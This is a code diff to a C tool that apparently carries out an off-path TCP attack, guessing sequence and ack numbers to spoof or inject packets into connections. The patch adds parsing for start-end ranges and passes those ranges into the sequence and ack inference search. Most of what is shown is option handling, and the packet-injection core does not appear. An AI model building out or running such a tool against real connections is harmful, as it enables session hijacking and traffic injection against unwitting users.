@@ -109,8 +109,8 @@ typedef struct thctx_struct {
 	int autostart;
 	u_long packets_per_second;
 	u_long packet_delay;
-	uint32_t start_seq;
-	uint32_t start_ack;
+	uint32_t start_seq, end_seq;
+	uint32_t start_ack, end_ack;
 	/* inject? */
 	char *inject_server;
 	off_t inject_server_len;
@@ -218,6 +218,46 @@ int validate_port(char *str)
 	return port;
 }
 
+int validate_seqack_one(char *str, uint32_t *pout)
+{
+	char *pend = NULL;
+	u_long tmp = strtoul(str, &pend, 0);
+
+	if (!pend || *pend || tmp > UINT32_MAX) {
+		fprintf(stderr, "[!] invalid sequence number: %s\n", str);
+		return -1;
+	}
+	*pout = (uint32_t)tmp;
+	return 1;
+}
+
+int validate_seqack(char *str, int allow_range, uint32_t *pstart, uint32_t *pend)
+{
+	char *str_end;
+
+	if (allow_range) {
+		char *pdash = strchr(str, '-');
+
+		if (pdash) {
+			*pdash++ = '\0'; // XXX: modifies arg
+			if (validate_seqack_one(pdash, pend) == -1)
+				return -1;
+		}
+	}
+
+	if (validate_seqack_one(str, pstart) == -1)
+		return -1;
+
+	/* swap the endpoints if someone specified something silly */
+	if (allow_range && *pend < *pstart) {
+		uint32_t tmp = *pend;
+		*pend = *pstart;
+		*pstart = tmp;
+	}
+
+	return 1;
+}
+
 /*
  * The main function of this program simply checks prelimary arguments and
  * and launches the attack.
@@ -277,7 +317,7 @@ int main(int argc, char *argv[])
 					u_long tmp = strtoul(optarg, &pend, 0);
 
 					if (!pend || *pend || tmp >= 1000000) {
-						fprintf(stderr, "invalid delay: %s\n", optarg);
+						fprintf(stderr, "[!] invalid delay: %s\n", optarg);
 						return 1;
 					}
 					g_ctx.packet_delay = tmp;
@@ -330,7 +370,7 @@ int main(int argc, char *argv[])
 					u_long tmp = strtoul(optarg, &pend, 0);
 
 					if (!pend || *pend || tmp > 1000000) {
-						fprintf(stderr, "invalid packet rate: %s\n", optarg);
+						fprintf(stderr, "[!] invalid packet rate: %s\n", optarg);
 						return 1;
 					}
 					g_ctx.packets_per_second = tmp;
@@ -339,33 +379,29 @@ int main(int argc, char *argv[])
 
 			case 'S':
 				{
-					char *pend = NULL;
-					u_long tmp = strtoul(optarg, &pend, 0);
+					uint32_t tmp;
 
-					if (!pend || *pend) {
-						fprintf(stderr, "invalid spoof sequence number: %s\n", optarg);
+					if (validate_seqack(optarg, 0, &tmp, NULL) == -1)
 						return 1;
-					}
 					g_ctx.spoof.seq = tmp;
 				}
 				break;
 
 			case 's':
 				{
-					char *pend = NULL;
-					u_long tmp = strtoul(optarg, &pend, 0);
+					uint32_t start, end = 0;
 
-					if (!pend || *pend || tmp > UINT32_MAX) {
-						fprintf(stderr, "invalid start sequence number: %s\n", optarg);
+					if (validate_seqack(optarg, 1, &start, &end) == -1)
 						return 1;
-					}
-					g_ctx.start_seq = tmp;
+					g_ctx.start_seq = start;
+					g_ctx.end_seq = end;
 				}
 				break;
 
 			case 'w':
 				{
 					int winsz = atoi(optarg);
+
 					if (winsz < 1 || winsz > 65535) {
 						fprintf(stderr, "[!] %s is not a valid window size.\n", optarg);
 						return 1;
@@ -376,32 +412,27 @@ int main(int argc, char *argv[])
 
 			case 'A':
 				{
-					char *pend = NULL;
-					u_long tmp = strtoul(optarg, &pend, 0);
+					uint32_t tmp;
 
-					if (!pend || *pend || tmp > UINT32_MAX) {
-						fprintf(stderr, "invalid spoof ack number: %s\n", optarg);
+					if (validate_seqack(optarg, 0, &tmp, NULL) == -1)
 						return 1;
-					}
 					g_ctx.spoof.ack = tmp;
 				}
 				break;
 
 			case 'a':
 				{
-					char *pend = NULL;
-					u_long tmp = strtoul(optarg, &pend, 0);
+					uint32_t start, end = 0;
 
-					if (!pend || *pend) {
-						fprintf(stderr, "invalid start ack number: %s\n", optarg);
+					if (validate_seqack(optarg, 1, &start, &end) == -1)
 						return 1;
-					}
-					g_ctx.start_ack = tmp;
+					g_ctx.start_ack = start;
+					g_ctx.end_ack = end;
 				}
 				break;
 
 			default:
-				fprintf(stderr, "invalid option '%c'! try -h ...\n", c);
+				fprintf(stderr, "[!] invalid option '%c'! try -h ...\n", c);
 				return 1;
 				/* not reached */
 				break;
@@ -481,9 +512,15 @@ int main(int argc, char *argv[])
 	if (g_ctx.start_seq)
 		printf("    starting with sequence: %lu (0x%lx)\n",
 				(u_long)g_ctx.start_seq, (u_long)g_ctx.start_seq);
+	if (g_ctx.end_seq)
+		printf("    ending with sequence: %lu (0x%lx)\n",
+				(u_long)g_ctx.end_seq, (u_long)g_ctx.end_seq);
 	if (g_ctx.start_ack)
 		printf("    starting with ack: %lu (0x%lx)\n",
 				(u_long)g_ctx.start_ack, (u_long)g_ctx.start_ack);
+	if (g_ctx.end_ack)
+		printf("    ending with ack: %lu (0x%lx)\n",
+				(u_long)g_ctx.end_ack, (u_long)g_ctx.end_ack);
 	if (g_ctx.packets_per_second != PACKETS_PER_SECOND)
 		printf("    packets per second: %lu\n", g_ctx.packets_per_second);
 	if (g_ctx.packet_delay != PACKET_DELAY)
@@ -1548,7 +1585,9 @@ int infer_sequence_number(void)
 	u_long guess_start = 0, guess_end = UINT32_MAX;
 
 	if (g_ctx.start_seq)
-		guess_start = g_ctx.start_seq - (g_ctx.winsz * 4);
+		guess_start = g_ctx.start_seq;
+	if (g_ctx.end_seq)
+		guess_end = g_ctx.end_seq;
 
 	if (!infer_sequence_step1(&guess_start, &guess_end))
 		return 0;
@@ -1606,6 +1645,8 @@ int infer_ack_number(void)
 		start_ack = end_ack = g_ctx.start_ack - (g_acks[2] - 1);
 		start_ack -= (g_ctx.winsz * 3);
 		bs_start = start_ack;
+		if (g_ctx.end_ack)
+			end_ack = g_ctx.end_ack - (g_acks[2] - 1);
 		end_ack += (g_ctx.winsz * 2);
 		bs_end = end_ack;
 		step = 1;
